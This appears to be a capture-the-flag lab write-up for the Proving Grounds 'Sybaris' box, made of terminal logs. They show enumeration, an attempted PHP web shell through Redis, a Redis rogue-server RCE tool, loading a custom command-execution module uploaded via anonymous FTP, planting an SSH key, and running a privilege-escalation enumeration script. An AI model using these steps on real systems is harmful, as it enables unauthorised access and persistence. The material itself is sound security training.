# Sybaris
# Enumeration

## nmap

```
# Nmap 7.91 scan initiated Sun Jan 23 06:43:44 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Sybaris/results/192.168.171.93/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Sybaris/results/192.168.171.93/scans/xml/_full_tcp_nmap.xml" 192.168.171.93
Nmap scan report for 192.168.171.93
Host is up, received user-set (0.25s latency).
Scanned at 2022-01-23 06:43:46 EST for 403s
Not shown: 65519 filtered ports
Reason: 65519 no-responses
PORT      STATE  SERVICE   REASON         VERSION
20/tcp    closed ftp-data  reset ttl 63
21/tcp    open   ftp       syn-ack ttl 63 vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0               6 Apr 01  2020 pub [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.49.171
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp    open   ssh       syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 21:94:de:d3:69:64:a8:4d:a8:f0:b5:0a:ea:bd:02:ad (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoWnaSOW2cc+sYUe6aqQSPWY9e9OWgerEomQZv6FujchbKcxcm6sPRTZJnGrPsDum5vx7otZDGG9Vc55NByLaLU9WoQTLPhnepGTMzbbg9DyIDR9HXFw3fX0s+vSvjvDo/Cz19gWKTB2lBfJgPa239Hp0NmaxOAXmJ+d+oUEmnhLmZ1wAQFvJ/9Ta2zt8q6KOvjykUcISuFwr741HwcudFS4Z84LsO+WbcIGtkTELLn9yFc3KiZraJYNi72rOKsxHip/98js8nEIsryRfo6sZexu4lxT5SchvDNQCirLSHsEIFyzde5Ym5FDf4hb831SwJqFg7qDO+wDT1/oZp/dnP
|   256 67:42:45:19:8b:f5:f9:a5:a4:cf:fb:87:48:a2:66:d0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLoSyEH4GdzHPYxZPUgKP068JBcpx5KSL1KzaMRo9xP4ai5QKUKJ+H2xu8atQdvkE0ul6GnDPVlZ5Flf/npwYWY=
|   256 f3:e2:29:a3:41:1e:76:1e:b1:b7:46:dc:0b:b9:91:77 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH4F/u2LLgVpGw2tr0bpe0MgbiV36HAzwcu5HqcuShJd
53/tcp    closed domain    reset ttl 63
80/tcp    open   http      syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) PHP/7.3.22)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: A4DA8778FE902EB34FD9A5D4C0A832E1
|_http-generator: HTMLy v2.7.5
| http-methods: 
|_  Supported Methods: GET POST
| http-robots.txt: 11 disallowed entries 
| /config/ /system/ /themes/ /vendor/ /cache/ 
| /changelog.txt /composer.json /composer.lock /composer.phar /search/ 
|_/admin/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.22
|_http-title: Sybaris - Just another HTMLy blog
6379/tcp  open   redis     syn-ack ttl 63 Redis key-value store 5.0.9
10091/tcp closed unknown   reset ttl 63
10092/tcp closed unknown   reset ttl 63
10093/tcp closed unknown   reset ttl 63
10094/tcp closed unknown   reset ttl 63
10095/tcp closed unknown   reset ttl 63
10096/tcp closed unknown   reset ttl 63
10097/tcp closed unknown   reset ttl 63
10098/tcp closed unknown   reset ttl 63
10099/tcp closed unknown   reset ttl 63
10100/tcp closed itap-ddtp reset ttl 63
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
Aggressive OS guesses: Linux 3.10 - 3.12 (93%), Linux 4.4 (93%), Linux 4.9 (92%), Linux 4.0 (89%), Linux 3.10 (88%), Linux 3.11 - 4.1 (88%), Linux 2.6.32 (88%), Linux 2.6.32 or 3.10 (88%), Linux 2.6.39 (88%), Linux 3.5 (88%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=1/23%OT=21%CT=20%CU=%PV=Y%DS=2%DC=T%G=N%TM=61ED4105%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=10A%TI=Z%II=I%TS=A)
OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%TG=40%W=7210%O=M506NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=N)
T7(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.003 days (since Sun Jan 23 06:45:48 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Unix

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   257.35 ms 192.168.49.1
2   257.34 ms 192.168.171.93

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 23 06:50:29 2022 -- 1 IP address (1 host up) scanned in 406.13 seconds

```

## 21 - FTP

```                                                                   
┌──(kali㉿kali)-[/tmp/redis-rce]
└─$ ftp 192.168.171.93 
Connected to 192.168.171.93.
220 (vsFTPd 3.0.2)
Name (192.168.171.93:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> lcd /tmp
Local directory now /tmp
ftp> put t
local: t remote: t
200 PORT command successful. Consider using PASV.
553 Could not create file.
ftp> ls
200 PORT command successful. Consider using PASV.
425 Failed to establish connection.
ftp> exit
421 Timeout.

┌──(kali㉿kali)-[~/Documents/Files]
└─$ ftp 192.168.142.93
Connected to 192.168.142.93.
220 (vsFTPd 3.0.2)
Name (192.168.142.93:kali): admin
530 This FTP server is anonymous only.
Login failed.
ftp> exit
221 Goodbye.
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Documents/Files]
└─$ 
```

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ pftp 192.168.95.93     
Connected to 192.168.95.93.
220 (vsFTPd 3.0.2)
Name (192.168.95.93:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
227 Entering Passive Mode (192,168,95,93,39,113).
150 Here comes the directory listing.
drwxrwxrwx    2 0        0               6 Apr 01  2020 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
227 Entering Passive Mode (192,168,95,93,39,111).
150 Here comes the directory listing.
226 Directory send OK.
ftp> lcd /tmp
Local directory now /tmp
ftp> put t
local: t remote: t
227 Entering Passive Mode (192,168,95,93,39,111).
150 Ok to send data.
226 Transfer complete.
ftp> del t
550 Permission denied.
ftp> ls
227 Entering Passive Mode (192,168,95,93,39,113).
150 Here comes the directory listing.
-rw-rw-rw-    1 14       50              0 Mar 02 08:14 t
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> put t
local: t remote: t
227 Entering Passive Mode (192,168,95,93,39,110).
553 Could not create file.
ftp> ls
227 Entering Passive Mode (192,168,95,93,39,109).
150 Here comes the directory listing.
drwxrwxrwx    2 0        0              15 Mar 02 08:14 pub
226 Directory send OK.
ftp> exit
221 Goodbye.
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Desktop]
└─$ 
```

## 80 - Web

![](Pasted%20image%2020220123203320.png)

![](Pasted%20image%2020220123203307.png)

## 6379 - Redis

### Web shell

```
┌──(kali㉿kali)-[/tmp]
└─$ redis-cli -h 192.168.171.93 
192.168.171.93:6379> config get dir
1) "dir"
2) "/"
192.168.171.93:6379> config set dir /var/www/html
OK
192.168.171.93:6379> config set dbfilename redis.php
OK
192.168.171.93:6379> set test "<form method='GET'><input type='TEXT' name='cmd' id='cmd' size='80'><input type='SUBMIT' value='Execute'></form><pre><?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?></pre>"
OK
192.168.171.93:6379> save
(error) ERR
192.168.171.93:6379> config set dir /tmp
OK
192.168.171.93:6379> save
OK
192.168.171.93:6379> config set dir /nonexistent
(error) ERR Changing directory: No such file or directory
192.168.171.93:6379> config set dir /usr/share/nginx/html 
(error) ERR Changing directory: No such file or directory
192.168.171.93:6379> 

```

### RCE Exploit Test


```
┌──(kali㉿kali)-[/tmp]
└─$ git clone https://github.com/Ridter/redis-rce.git                                                                                                               1 ⚙
Cloning into 'redis-rce'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (1/1), done.
remote: Total 18 (delta 0), reused 0 (delta 0), pack-reused 17
Receiving objects: 100% (18/18), 15.19 KiB | 5.06 MiB/s, done.
Resolving deltas: 100% (6/6), done.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cd redis-rce                                                                                                                                                    1 ⚙
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/redis-rce]
└─$ sudo python redis-rce.py -r 192.168.123.69  -L 192.168.49.123  -f ../RedisModules-ExecuteCommand/module.so -P 6379                                              1 ⚙
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/redis-rce]
└─$ cd ..                                                                                                                                                     130 ⨯ 1 ⚙
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git                                                                                           1 ⚙
Cloning into 'RedisModules-ExecuteCommand'...
remote: Enumerating objects: 494, done.
remote: Total 494 (delta 0), reused 0 (delta 0), pack-reused 494
Receiving objects: 100% (494/494), 207.20 KiB | 6.91 MiB/s, done.
Resolving deltas: 100% (286/286), done.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cd RedisModules-ExecuteCommand                                                                                                                                  1 ⚙
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/RedisModules-ExecuteCommand]
└─$ make                                                                                                                                                            1 ⚙
make -C ./src
make[1]: Entering directory '/tmp/RedisModules-ExecuteCommand/src'
make -C ../rmutil
make[2]: Entering directory '/tmp/RedisModules-ExecuteCommand/rmutil'
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o util.o util.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o strings.o strings.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o sds.o sds.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o vector.o vector.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o alloc.o alloc.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o periodic.o periodic.c
ar rcs librmutil.a util.o strings.o sds.o vector.o alloc.o periodic.o
make[2]: Leaving directory '/tmp/RedisModules-ExecuteCommand/rmutil'
gcc -I../ -Wall -g -fPIC -lc -lm -std=gnu99     -c -o module.o module.c
module.c: In function ‘DoCommand’:
module.c:16:29: warning: initialization discards ‘const’ qualifier from pointer target type [-Wdiscarded-qualifiers]
   16 |                 char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);
      |                             ^~~~~~~~~~~~~~~~~~~~~~~~
module.c:23:29: warning: implicit declaration of function ‘strlen’ [-Wimplicit-function-declaration]
   23 |                         if (strlen(buf) + strlen(output) >= size) {
      |                             ^~~~~~
module.c:11:1: note: include ‘<string.h>’ or provide a declaration of ‘strlen’
   10 | #include <netinet/in.h>
  +++ |+#include <string.h>
   11 | 
module.c:23:29: warning: incompatible implicit declaration of built-in function ‘strlen’ [-Wbuiltin-declaration-mismatch]
   23 |                         if (strlen(buf) + strlen(output) >= size) {
      |                             ^~~~~~
module.c:23:29: note: include ‘<string.h>’ or provide a declaration of ‘strlen’
module.c:27:25: warning: implicit declaration of function ‘strcat’ [-Wimplicit-function-declaration]
   27 |                         strcat(output, buf);
      |                         ^~~~~~
module.c:27:25: note: include ‘<string.h>’ or provide a declaration of ‘strcat’
module.c:27:25: warning: incompatible implicit declaration of built-in function ‘strcat’ [-Wbuiltin-declaration-mismatch]
module.c:27:25: note: include ‘<string.h>’ or provide a declaration of ‘strcat’
module.c:29:80: warning: incompatible implicit declaration of built-in function ‘strlen’ [-Wbuiltin-declaration-mismatch]
   29 |                 RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
      |                                                                                ^~~~~~
module.c:29:80: note: include ‘<string.h>’ or provide a declaration of ‘strlen’
module.c: In function ‘RevShellCommand’:
module.c:41:28: warning: initialization discards ‘const’ qualifier from pointer target type [-Wdiscarded-qualifiers]
   41 |                 char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
      |                            ^~~~~~~~~~~~~~~~~~~~~~~~
module.c:42:32: warning: initialization discards ‘const’ qualifier from pointer target type [-Wdiscarded-qualifiers]
   42 |                 char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
      |                                ^~~~~~~~~~~~~~~~~~~~~~~~
module.c:48:38: warning: implicit declaration of function ‘inet_addr’ [-Wimplicit-function-declaration]
   48 |                 sa.sin_addr.s_addr = inet_addr(ip);
      |                                      ^~~~~~~~~
module.c:57:17: warning: argument 2 null where non-null expected [-Wnonnull]
   57 |                 execve("/bin/sh", 0, 0);
      |                 ^~~~~~
In file included from module.c:4:
/usr/include/unistd.h:561:12: note: in a call to function ‘execve’ declared ‘nonnull’
  561 | extern int execve (const char *__path, char *const __argv[],
      |            ^~~~~~
ld -o module.so module.o -shared -Bsymbolic  -L../rmutil -lrmutil -lc 
make[1]: Leaving directory '/tmp/RedisModules-ExecuteCommand/src'
cp ./src/module.so .
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/RedisModules-ExecuteCommand]
└─$ cd ../redis-rce                                                                                                                                                 1 ⚙
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/redis-rce]
└─$ sudo python redis-rce.py -r 192.168.171.93  -L 192.168.49.171  -f ../RedisModules-ExecuteCommand/module.so -P 6379                                              1 ⚙
[sudo] password for kali: 

█▄▄▄▄ ▄███▄   ██▄   ▄█    ▄▄▄▄▄       █▄▄▄▄ ▄█▄    ▄███▄   
█  ▄▀ █▀   ▀  █  █  ██   █     ▀▄     █  ▄▀ █▀ ▀▄  █▀   ▀  
█▀▀▌  ██▄▄    █   █ ██ ▄  ▀▀▀▀▄       █▀▀▌  █   ▀  ██▄▄    
█  █  █▄   ▄▀ █  █  ▐█  ▀▄▄▄▄▀        █  █  █▄  ▄▀ █▄   ▄▀ 
  █   ▀███▀   ███▀   ▐                  █   ▀███▀  ▀███▀   
 ▀                                     ▀                   


[*] Connecting to  192.168.171.93:6379...
[*] Sending SLAVEOF command to server
[+] Accepted connection from 192.168.171.93:6379
[*] Setting filename
[+] Accepted connection from 192.168.171.93:6379
[*] Start listening on 192.168.49.171:6379
[*] Tring to run payload
[+] Accepted connection from 192.168.171.93:37481
[*] Closing rogue server...

[+] What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: i
[+] Interactive shell open , use "exit" to exit...
$ whoami
[-] Error:-ERR unknown command `system.exec`, with args beginning with: `whoami`, , check your module!
[*] Clean up..
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/redis-rce]
└─$   
```

# Exploit

https://www.linuxquestions.org/questions/red-hat-31/direct-access-on-pub-directory-for-anonymous-user-on-ftp-server-4175504168/

```bash
┌──(kali㉿kali)-[/tmp]
└─$ git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git 
Cloning into 'RedisModules-ExecuteCommand'...
remote: Enumerating objects: 494, done.
remote: Total 494 (delta 0), reused 0 (delta 0), pack-reused 494
Receiving objects: 100% (494/494), 207.20 KiB | 3.00 KiB/s, done.
Resolving deltas: 100% (286/286), done.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cd RedisModules-ExecuteCommand 
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/RedisModules-ExecuteCommand]
└─$ make                  
make -C ./src
make[1]: Entering directory '/tmp/RedisModules-ExecuteCommand/src'
make -C ../rmutil
make[2]: Entering directory '/tmp/RedisModules-ExecuteCommand/rmutil'
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o util.o util.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o strings.o strings.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o sds.o sds.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o vector.o vector.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o alloc.o alloc.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o periodic.o periodic.c
ar rcs librmutil.a util.o strings.o sds.o vector.o alloc.o periodic.o
make[2]: Leaving directory '/tmp/RedisModules-ExecuteCommand/rmutil'
gcc -I../ -Wall -g -fPIC -lc -lm -std=gnu99     -c -o module.o module.c
module.c: In function ‘DoCommand’:
module.c:16:29: warning: initialization discards ‘const’ qualifier from pointer target type [-Wdiscarded-qualifiers]
   16 |                 char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);
      |                             ^~~~~~~~~~~~~~~~~~~~~~~~
module.c:23:29: warning: implicit declaration of function ‘strlen’ [-Wimplicit-function-declaration]
   23 |                         if (strlen(buf) + strlen(output) >= size) {
      |                             ^~~~~~
module.c:11:1: note: include ‘<string.h>’ or provide a declaration of ‘strlen’
   10 | #include <netinet/in.h>
  +++ |+#include <string.h>
   11 | 
module.c:23:29: warning: incompatible implicit declaration of built-in function ‘strlen’ [-Wbuiltin-declaration-mismatch]
   23 |                         if (strlen(buf) + strlen(output) >= size) {
      |                             ^~~~~~
module.c:23:29: note: include ‘<string.h>’ or provide a declaration of ‘strlen’
module.c:27:25: warning: implicit declaration of function ‘strcat’ [-Wimplicit-function-declaration]
   27 |                         strcat(output, buf);
      |                         ^~~~~~
module.c:27:25: note: include ‘<string.h>’ or provide a declaration of ‘strcat’
module.c:27:25: warning: incompatible implicit declaration of built-in function ‘strcat’ [-Wbuiltin-declaration-mismatch]
module.c:27:25: note: include ‘<string.h>’ or provide a declaration of ‘strcat’
module.c:29:80: warning: incompatible implicit declaration of built-in function ‘strlen’ [-Wbuiltin-declaration-mismatch]
   29 |                 RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
      |                                                                                ^~~~~~
module.c:29:80: note: include ‘<string.h>’ or provide a declaration of ‘strlen’
module.c: In function ‘RevShellCommand’:
module.c:41:28: warning: initialization discards ‘const’ qualifier from pointer target type [-Wdiscarded-qualifiers]
   41 |                 char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
      |                            ^~~~~~~~~~~~~~~~~~~~~~~~
module.c:42:32: warning: initialization discards ‘const’ qualifier from pointer target type [-Wdiscarded-qualifiers]
   42 |                 char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
      |                                ^~~~~~~~~~~~~~~~~~~~~~~~
module.c:48:38: warning: implicit declaration of function ‘inet_addr’ [-Wimplicit-function-declaration]
   48 |                 sa.sin_addr.s_addr = inet_addr(ip);
      |                                      ^~~~~~~~~
module.c:57:17: warning: argument 2 null where non-null expected [-Wnonnull]
   57 |                 execve("/bin/sh", 0, 0);
      |                 ^~~~~~
In file included from module.c:4:
/usr/include/unistd.h:561:12: note: in a call to function ‘execve’ declared ‘nonnull’
  561 | extern int execve (const char *__path, char *const __argv[],
      |            ^~~~~~
ld -o module.so module.o -shared -Bsymbolic  -L../rmutil -lrmutil -lc 
make[1]: Leaving directory '/tmp/RedisModules-ExecuteCommand/src'
cp ./src/module.so .
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/RedisModules-ExecuteCommand]
└─$ ftp 192.168.142.93
Connected to 192.168.142.93.
220 (vsFTPd 3.0.2)
Name (192.168.142.93:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd pub
250 Directory successfully changed.
ftp> put module.so
local: module.so remote: module.so
200 PORT command successful. Consider using PASV.

help
^C
421 Service not available, remote server has closed connection

send aborted
waiting for remote to finish abort
ftp> exit
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/RedisModules-ExecuteCommand]
└─$ pftp 192.168.142.93
Connected to 192.168.142.93.
220 (vsFTPd 3.0.2)
Name (192.168.142.93:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
227 Entering Passive Mode (192,168,142,93,39,106).
^C
receive aborted
waiting for remote to finish abort
ftp> put module.so
local: module.so remote: module.so
227 Entering Passive Mode (192,168,142,93,39,111).
553 Could not create file.
ftp> ls
227 Entering Passive Mode (192,168,142,93,39,107).
150 Here comes the directory listing.
-rw-rw-rw-    1 14       50              0 Mar 08 23:51 module.so
226 Directory send OK.
ftp> put module.so m.so
local: module.so remote: m.so
227 Entering Passive Mode (192,168,142,93,39,107).
150 Ok to send data.
226 Transfer complete.
47832 bytes sent in 0.89 secs (52.4039 kB/s)
ftp> 
```

```bash
┌──(kali㉿kali)-[~]
└─$ redis-cli -h 192.168.142.93                             
192.168.142.93:6379> MODULE LIST
(empty array)
(0.69s)
192.168.142.93:6379> MODULE LOAD /var/ftp/pub/module.so
(error) ERR Error loading the extension. Please check the server logs.
(0.89s)
192.168.142.93:6379> MODULE LOAD /var/ftp/pub/module.s
(error) ERR Error loading the extension. Please check the server logs.
(0.58s)
192.168.142.93:6379> MODULE LOAD /var/ftp/pub/m.so
OK
(0.54s)
192.168.142.93:6379> MODULE LIST
1) 1) "name"
   2) "system"
   3) "ver"
   4) (integer) 1
192.168.142.93:6379> system.exec "whoami"
"pablo\n"
(0.71s)
192.168.142.93:6379> system.exec "ls /home/pablo -al"
"total 16\ndrwxr-xr-x. 2 pablo pablo 100 Sep  4  2020 .\ndrwxr-xr-x. 3 root  root   19 Sep  4  2020 ..\nlrwxrwxrwx. 1 pablo pablo   9 Sep  4  2020 .bash_history -> /dev/null\n-rw-r--r--. 1 pablo pablo  18 Mar 31  2020 .bash_logout\n-rw-r--r--. 1 pablo pablo 193 Mar 31  2020 .bash_profile\n-rw-r--r--. 1 pablo pablo 231 Mar 31  2020 .bashrc\n-rw-r--r--. 1 pablo pablo  33 Mar  8 18:29 local.txt\n"
192.168.142.93:6379> system.exec "mkdir -p /home/pablo/.ssh"
""
192.168.142.93:6379> system.exec "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7bL6/5bwR/NXrutNtFABTqohh2vrMFqeiY7ZKXg/xkdow2hF29mC6HUHXTv2c1oVfEH5l3fXgX67abSr2mliQnnFdxVPmONQhe3GUz818fXzM0UMyQhhiq/ZdJCEe/Y0pyv3akIzePTdV25AYUmbLr3hiDfVjJ56YEnuul3LkMq/O2nCXanGmUGoHWGeqMMPsHNvI4M7k02H/0kFdgm7cBJNkgA9Q2sHmOgPl4Pi2mymbhznkSz4uwU5HOPO/bXw4pMeQbTopRs+q+oZArCm9PYwpAzqnXkcmos8MQla4BZOxSY4TKhDvRedfh4x/4nXdHEwMJVf2w8A2ThuHTbp9DoOLft9FHdOv/q/DiN/HpiUg84tOOB42daaUY9jh2/aArPkG3KjZKR9XnIZfgmu56S5lS/MQCdLv8ApbtsGOFnoHZcfAwbtJ+6b4inPYuazgqr1Up6Rc7CQ+JIijQRO9dpSvHGLoEjaNnOsPW7hM= kali@kali' > /home/pablo/.ssh/authorized_keys"
""
192.168.142.93:6379> 

```

```bash                                                              
┌──(kali㉿kali)-[~]
└─$ cat .ssh/id_rsa.pub                                                                                                                                           130 ⨯
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7bL6/5bwR/NXrutNtFABTqohh2vrMFqeiY7ZKXg/xkdow2hF29mC6HUHXTv2c1oVfEH5l3fXgX67abSr2mliQnnFdxVPmONQhe3GUz818fXzM0UMyQhhiq/ZdJCEe/Y0pyv3akIzePTdV25AYUmbLr3hiDfVjJ56YEnuul3LkMq/O2nCXanGmUGoHWGeqMMPsHNvI4M7k02H/0kFdgm7cBJNkgA9Q2sHmOgPl4Pi2mymbhznkSz4uwU5HOPO/bXw4pMeQbTopRs+q+oZArCm9PYwpAzqnXkcmos8MQla4BZOxSY4TKhDvRedfh4x/4nXdHEwMJVf2w8A2ThuHTbp9DoOLft9FHdOv/q/DiN/HpiUg84tOOB42daaUY9jh2/aArPkG3KjZKR9XnIZfgmu56S5lS/MQCdLv8ApbtsGOFnoHZcfAwbtJ+6b4inPYuazgqr1Up6Rc7CQ+JIijQRO9dpSvHGLoEjaNnOsPW7hM= kali@kali
```

![](Pasted%20image%2020220309075727.png)

# Privesc

![](Pasted%20image%2020220309080305.png)

```bash
.
[pablo@sybaris tmp]$ wget 192.168.49.142:6379/lse.sh
--2022-03-08 18:59:03--  http://192.168.49.142:6379/lse.sh
Connecting to 192.168.49.142:6379... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43570 (43K) [text/x-sh]
Saving to: ‘lse.sh’

100%[==============================================================================================================================>] 43,570       102KB/s   in 0.4s   

2022-03-08 18:59:03 (102 KB/s) - ‘lse.sh’ saved [43570/43570]

[pablo@sybaris tmp]$ chmod +x lse.sh
[pablo@sybaris tmp]$ ./lse.sh
---
If you know the current user password, write it here to check sudo privileges:                                                                                          
---
                                                                                                                                                                        
 LSE Version: 3.7                                                                                                                                                       

        User: pablo
     User ID: 1000
    Password: none
        Home: /home/pablo
        Path: /usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/pablo/.local/bin:/home/pablo/bin
       umask: 0002

    Hostname: sybaris
       Linux: 3.10.0-1127.19.1.el7.x86_64
Distribution: CentOS Linux 7 (Core)
Architecture: x86_64

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in administrative groups?................. nope
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip                                                                                        
[i] usr060 Other users..................................................... skip                                                                                        
[*] usr070 PATH variables defined inside /etc.............................. yes!                                                                                        
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ nope
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ nope
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip                                                                                        
[!] fst060 Can we write to any setgid binary?.............................. skip                                                                                        
[*] fst070 Can we read /root?.............................................. nope                                                                                        
[*] fst080 Can we read subdirectories under /home?......................... nope
[*] fst090 SSH files in home directories................................... yes!
[*] fst100 Useful binaries................................................. yes!
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'pablo' have mail?......................................... yes!
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. nope
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
[!] fst190 Can we read any backup?......................................... nope
[!] fst200 Are there possible credentials in any shell history file?....... nope
[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
[i] fst500 Files owned by user 'pablo'..................................... skip
[i] fst510 SSH files anywhere.............................................. skip                                                                                        
[i] fst520 Check hosts.equiv file and its contents......................... skip                                                                                        
[i] fst530 List NFS server shares.......................................... skip                                                                                        
[i] fst540 Dump fstab file................................................. skip                                                                                        
=================================================================( system )=====                                                                                        
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip                                                                                        
[!] sys020 Does the /etc/passwd have hashes?............................... nope                                                                                        
[!] sys022 Does the /etc/group have hashes?................................ nope
[!] sys030 Can we read shadow files?....................................... nope
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... nope
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip                                                                                        
[i] sys080 System password policies in /etc/login.defs..................... skip                                                                                        
===============================================================( security )=====                                                                                        
[*] sec000 Is SELinux present?............................................. yes!
[*] sec010 List files with capabilities.................................... yes!
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
